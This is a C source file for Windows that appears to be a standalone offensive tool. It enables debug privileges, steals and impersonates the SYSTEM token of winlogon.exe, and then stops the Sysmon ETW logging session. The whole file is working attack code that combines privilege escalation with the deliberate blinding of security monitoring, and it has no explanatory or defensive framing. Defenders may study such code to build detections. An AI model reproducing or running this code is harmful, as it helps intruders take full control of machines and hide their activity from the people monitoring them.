#include <Windows.h>
#include <TlHelp32.h>
#include <evntrace.h>
#include <tchar.h>

#define MAX_NAMESIZE 1024
#define SESSION_NAME _T("EventLog-Microsoft-Windows-Sysmon-Operational")

BOOL SetPrivilege(HANDLE hToken, LPCTSTR lpszPrivilege)
{
	TOKEN_PRIVILEGES tp = {0};
	LUID luid;
	DWORD dwLastError;

	if (!LookupPrivilegeValue(NULL, lpszPrivilege, &luid))
	{
		_tprintf(_T("[-] LookupPrivilegeValue error: %d\r\n"), GetLastError());
		return FALSE;
	}

	tp.PrivilegeCount = 1;
	tp.Privileges[0].Luid = luid;
	tp.Privileges[0].Attributes = SE_PRIVILEGE_ENABLED;

	if (!AdjustTokenPrivileges(hToken, FALSE, &tp, sizeof(TOKEN_PRIVILEGES), (PTOKEN_PRIVILEGES)NULL, (PDWORD)NULL))
	{
		_tprintf(_T("[-] AdjustTokenPrivileges error: %d\r\n"), GetLastError());
		return FALSE;
	}
	dwLastError = GetLastError();
	if (ERROR_NOT_ALL_ASSIGNED == dwLastError)
	{
		DWORD dwPrivilegeNameLen = 0;
		PTSTR ptszPrivilegeName;
		LookupPrivilegeName(NULL, &luid, _T(""), &dwPrivilegeNameLen);
		ptszPrivilegeName = (PTSTR)LocalAlloc(LPTR, (size_t)(dwPrivilegeNameLen + 1) * sizeof(TCHAR));
		//safely ignore errors
		LookupPrivilegeName(NULL, &luid, ptszPrivilegeName, &dwPrivilegeNameLen);
		_tprintf(_T("[-] The token does not have the privilege \"%s\".\r\n"), ptszPrivilegeName);
		LocalFree(ptszPrivilegeName);
		return FALSE;
	}
	return TRUE;
}

DWORD getWinlogonPID(void)
{
	PROCESSENTRY32W entry = {0};
	entry.dwSize = sizeof(PROCESSENTRY32W);
	HANDLE snapshot = CreateToolhelp32Snapshot(TH32CS_SNAPPROCESS, 0);
	if (TRUE == Process32First(snapshot, &entry))
	{
		while (TRUE == Process32Next(snapshot, &entry))
		{
			if (0 == _tcsicmp(entry.szExeFile, _T("winlogon.exe")))
			{
				_tprintf(_T("[>] Winlogon PID Found %d\r\n"), entry.th32ProcessID);
				return entry.th32ProcessID;
			}
		}
	}
	return 0;
}

BOOL elevateSystem(void)
{
	HANDLE currentTokenHandle = NULL;
	BOOL getCurrentToken;
	getCurrentToken = OpenProcessToken(GetCurrentProcess(), TOKEN_ADJUST_PRIVILEGES, &currentTokenHandle);
	if (!getCurrentToken)
	{
		_tprintf(_T("[-] OpenProcessToken() failed.\r\n"));
		return FALSE;
	}
	if (!SetPrivilege(currentTokenHandle, SE_DEBUG_NAME) && !SetPrivilege(currentTokenHandle, SE_IMPERSONATE_NAME))
	{
		_tprintf(_T("[-] SetPrivilege() failed.\r\n"));
		return FALSE;
	}
	HANDLE processHandle;
	HANDLE tokenHandle = NULL;
	HANDLE duplicateTokenHandle = NULL;
	DWORD pidToImpersonate;
	pidToImpersonate = getWinlogonPID();
	if (0 == pidToImpersonate)
	{
		_tprintf(_T("[-] PID of winlogon not found.\r\n"));
		return FALSE;
	}
	processHandle = OpenProcess(PROCESS_ALL_ACCESS, TRUE, pidToImpersonate);
	if (NULL == processHandle)
	{
		_tprintf(_T("[-] OpenProcess failed.\r\n"));
		return FALSE;
	}
	if (!OpenProcessToken(processHandle, TOKEN_DUPLICATE | TOKEN_IMPERSONATE | TOKEN_QUERY, &tokenHandle))
	{
		_tprintf(_T("[-] OpenProcessToken failed.\r\n"));
		CloseHandle(processHandle);
		return FALSE;
	}
	SECURITY_IMPERSONATION_LEVEL seimp = SecurityImpersonation;
	TOKEN_TYPE tk = TokenPrimary;
	if (!DuplicateTokenEx(tokenHandle, MAXIMUM_ALLOWED, NULL, seimp, tk, &duplicateTokenHandle))
	{
		_tprintf(_T("[-] DuplicateTokenEx failed.\r\n"));
		CloseHandle(processHandle);
		CloseHandle(tokenHandle);
		return FALSE;
	}
	if (!ImpersonateLoggedOnUser(duplicateTokenHandle))
	{
		_tprintf(_T("[-] ImpersonateLoggedOnUser failed.\r\n"));
		CloseHandle(duplicateTokenHandle);
		CloseHandle(tokenHandle);
		CloseHandle(processHandle);
		return FALSE;
	}
	CloseHandle(duplicateTokenHandle);
	CloseHandle(tokenHandle);
	CloseHandle(processHandle);
	_tprintf(_T("[+] Successfully elevated to NT AUTHORITY\\SYSTEM\r\n"));
	return TRUE;
}


ULONG stopEtwSession(const TCHAR* ptszSessionName)
{
	const ULONG stBufferSize = sizeof(EVENT_TRACE_PROPERTIES) + MAX_NAMESIZE;
	PEVENT_TRACE_PROPERTIES pProps;
	ULONG ulStatus;
	pProps = (PEVENT_TRACE_PROPERTIES)LocalAlloc(LPTR, stBufferSize);

	if (!pProps)
	{
		return ERROR_OUTOFMEMORY;
	}

	pProps->Wnode.BufferSize = stBufferSize;
	pProps->Wnode.Flags = WNODE_FLAG_TRACED_GUID;
	pProps->LoggerNameOffset = sizeof(EVENT_TRACE_PROPERTIES);

	ulStatus = ControlTrace(0, ptszSessionName, pProps, EVENT_TRACE_CONTROL_STOP);

	LocalFree(pProps);
	return ulStatus;
}


int _tmain(int argc, _TCHAR** argv, _TCHAR** envp)
{
	UNREFERENCED_PARAMETER(argc);
	UNREFERENCED_PARAMETER(argv);
	UNREFERENCED_PARAMETER(envp);

	if (!elevateSystem())
	{
		_tprintf(_T("[-] Cannot elevate. Try to re-launch the tool as Admin or NT AUTHORITY\\SYSTEM.\r\n"));
		return ERROR_ACCESS_DENIED;
	}

	ULONG ulRes;
	ulRes = stopEtwSession(SESSION_NAME);
	if (ERROR_SUCCESS != ulRes)
	{
		_tprintf(_T("[-] Failed to stop Sysmon ETW session. Error: %lu\r\n"), ulRes);
		if (ERROR_WMI_INSTANCE_NOT_FOUND == ulRes)
		{
			_tprintf(_T("[?] Sysmon ETW session not found. Are you sure Sysmon is running?\r\n"));
		}
	}
	else //success
	{
		_tprintf(_T("[+] Successfully stopped Sysmon ETW session.\r\n"));
	}
	return (int)ulRes;
}
